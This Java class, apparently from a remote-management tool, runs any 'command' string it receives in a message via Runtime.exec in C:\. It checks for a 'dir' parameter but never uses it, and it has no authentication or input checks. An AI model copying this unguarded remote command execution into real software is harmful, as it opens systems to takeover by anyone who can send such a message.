package com.DarkKeks.drm.tasks;

import com.DarkKeks.drm.Log;
import com.DarkKeks.drm.Message;
import com.DarkKeks.drm.Parameter;

import java.io.*;

public class ConsoleCommandTask extends Task {

    public ConsoleCommandTask(int id, Message msg) {
        super(id, msg);
    }

    @Override
    protected Message respond(Message message) {
        Parameter command = msg.getParams().get("command");
        Parameter dir = msg.getParams().get("dir");
        if(command == null || dir == null) return invalidParams().build();

        try {
            Process process = Runtime.getRuntime().exec(command.getStringContent(), null, new File("C:\\"));
            InputStream is = process.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            while(process.isAlive()){
                if(br.ready()){
                    String line = br.readLine();
                    System.out.println(line);
                }
            }
        } catch (IOException e) {
            Log.logException(e);
        }

        return success().build();
    }


}
